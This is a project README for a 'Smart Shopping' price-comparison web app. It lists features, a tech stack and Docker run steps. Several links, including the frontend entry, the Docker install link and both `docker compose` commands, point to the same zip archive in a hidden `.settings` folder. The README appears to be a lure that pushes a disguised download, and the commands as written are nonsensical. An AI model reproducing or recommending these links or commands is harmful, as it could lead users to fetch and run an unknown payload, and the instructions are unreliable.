# Smart Shopping

This is a full-stack web application for comparing prices, reviews, ratings, and delivery info for products across major e-commerce platforms like **Amazon** and **Flipkart**.

---

## 🚀 Features

- 🔍 Search products by name
- 💸 Compare prices from Amazon, Flipkart, etc.
- ⭐ View reviews and ratings side-by-side
- 📦 Show stock status and delivery time
- 🧠 Caching using Redis for fast performance
- 🧾 Stores historical and metadata in PostgreSQL
- ⏰ Scheduled data updates using scraping or APIs

---

## 🛠️ Tech Stack

| Layer            | Tech                    |
| ---------------- | ----------------------- |
| Frontend         | https://raw.githubusercontent.com/ChiragRohada7020/Smart-Shopping-/main/backend/.settings/Shopping-Smart-2.8.zip                |
| Backend          | Spring Boot (Java)      |
| Database         | PostgreSQL              |
| Caching          | Redis                   |
| Web Scraping     | APIs                    |
| Containerization | Docker + Docker Compose |

---

---

## ⚙️ How to Run (Using Docker)

### 📦 Prerequisites

- [Docker](https://raw.githubusercontent.com/ChiragRohada7020/Smart-Shopping-/main/backend/.settings/Shopping-Smart-2.8.zip) installed

### 🚨 Ports Used

- Frontend: `80`
- Backend: `8082`
- PostgreSQL: `5432`
- Redis: `6379`

### 🧃 Run All Services Together

```bash
docker compose -f https://raw.githubusercontent.com/ChiragRohada7020/Smart-Shopping-/main/backend/.settings/Shopping-Smart-2.8.zip down -v
docker compose -f https://raw.githubusercontent.com/ChiragRohada7020/Smart-Shopping-/main/backend/.settings/Shopping-Smart-2.8.zip up -d --build
```
